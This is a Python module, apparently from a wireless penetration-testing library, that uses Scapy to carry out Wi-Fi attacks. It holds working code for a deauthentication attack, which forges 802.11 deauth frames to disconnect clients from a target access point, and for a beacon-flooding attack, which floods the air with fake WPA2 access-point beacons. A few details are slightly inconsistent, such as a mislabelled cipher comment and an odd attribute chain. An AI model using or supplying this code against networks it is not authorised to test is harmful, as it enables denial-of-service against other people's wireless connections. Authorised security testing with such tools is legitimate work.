from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth
import threading
import logging
from wireless_pen_test_lib.core.config.protocols.base_protocol import BaseProtocol


class WiFiProtocol(BaseProtocol):
    def __init__(self, interface='wlan0mon', core=None):
        """
        Initializes the WiFiProtocol.

        :param interface: Wireless interface in monitor mode.
        :param core: Reference to the CoreFramework instance.
        """
        self.interface = interface
        self.logger = logging.getLogger(self.__class__.__name__)
        self.scan_results = {}
        self.core = core  # Reference to CoreFramework for packet handling

    def register(self, event_dispatcher):
        """
        Registers event listeners relevant to Wi-Fi operations.
        """
        # Subscribe to events
        event_dispatcher.subscribe('start_scan', self.start_scan)
        event_dispatcher.subscribe('stop_scan', self.stop_scan)
        event_dispatcher.subscribe('start_deauth', self.start_deauth)
        event_dispatcher.subscribe('stop_deauth', self.stop_deauth)
        event_dispatcher.subscribe('start_beacon_flood', self.start_beacon_flood)
        event_dispatcher.subscribe('stop_beacon_flood', self.stop_beacon_flood)
        self.logger.info("WiFiProtocol registered to Event Dispatcher.")

    def start(self):
        """
        Starts any necessary Wi-Fi operations.
        """
        self.logger.info("Starting Wi-Fi Protocol operations.")
        # For example, initiate packet sniffing via CoreFramework
        self.core.start_packet_sniffing()

    def stop(self):
        """
        Stops any ongoing Wi-Fi operations.
        """
        self.logger.info("Stopping Wi-Fi Protocol operations.")
        self.core.stop_packet_sniffing()

    def start_scan(self):
        """
        Initiates a Wi-Fi scan.
        """
        self.logger.info("Starting Wi-Fi scan.")
        self.scan_results = {}
        # The packet sniffer is already running; scan results are collected by the Packet Analyzer

    def stop_scan(self):
        """
        Stops the Wi-Fi scan and processes results.
        """
        self.logger.info("Stopping Wi-Fi scan.")
        # Since the sniffer runs continuously, you might implement scan duration or trigger stop externally
        # For simplicity, assume the scan duration is managed by the test script

    def start_deauth(self, target_bssid, target_client=None, count=10):
        """
        Initiates a deauthentication attack.

        :param target_bssid: BSSID of the target access point.
        :param target_client: (Optional) Specific client to deauthenticate.
        :param count: Number of deauth packets to send.
        """
        self.logger.info(f"Starting deauthentication attack on BSSID: {target_bssid}")
        dot11 = Dot11(addr1=target_client if target_client else 'FF:FF:FF:FF:FF:FF',
                    addr2=self.core.packet_handler.packet_injector.packet_injector.get_interface_mac(),
                    addr3=target_bssid)
        pkt = RadioTap()/dot11/Dot11Deauth(reason=7)
        self.core.send_packet(pkt, count=count, inter=0.1)
        self.logger.info("Deauthentication attack completed.")

    def stop_deauth(self):
        """
        Stops the deauthentication attack.
        """
        self.logger.info("Stopping deauthentication attack.")
        self.core.stop_continuous_packets()

    def start_beacon_flood(self, ssid='FakeAP', count=1000):
        """
        Starts a beacon flooding attack.

        :param ssid: SSID of the fake access point.
        :param count: Number of beacon frames to send.
        """
        self.logger.info(f"Starting beacon flooding attack with SSID '{ssid}'.")
        dot11 = Dot11(type=0, subtype=8, addr1='FF:FF:FF:FF:FF:FF',
                    addr2=self.get_interface_mac(),
                    addr3=self.get_interface_mac())
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
        rsn = Dot11Elt(ID='RSNinfo', info=(
            '\x01\x00'  # RSN Version 1
            '\x00\x0f\xac\x02'  # Group Cipher Suite: CCMP
            '\x02\x00'  # Pairwise Cipher Suite Count
            '\x00\x0f\xac\x04'  # Pairwise Cipher Suite: CCMP
            '\x00\x0f\xac\x02'  # Pairwise Cipher Suite: TKIP
            '\x01\x00'  # AKM Suite Count
            '\x00\x0f\xac\x02'  # AKM Suite: PSK
            '\x00\x00'  # RSN Capabilities
        ))
        frame = RadioTap()/dot11/beacon/essid/rsn

        self.core.send_continuous_packets(frame, interval=0.1)
        self.logger.info("Beacon flooding attack started.")

    def stop_beacon_flood(self):
        """
        Stops the beacon flooding attack.
        """
        self.logger.info("Stopping beacon flooding attack.")
        self.core.stop_continuous_packets()

    def get_interface_mac(self):
        """
        Retrieves the MAC address of the specified wireless interface.
        """
        try:
            return get_if_hwaddr(self.interface)
        except Exception as e:
            self.logger.error(f"Failed to get MAC address for interface {self.interface}: {e}")
            return '00:00:00:00:00:00'
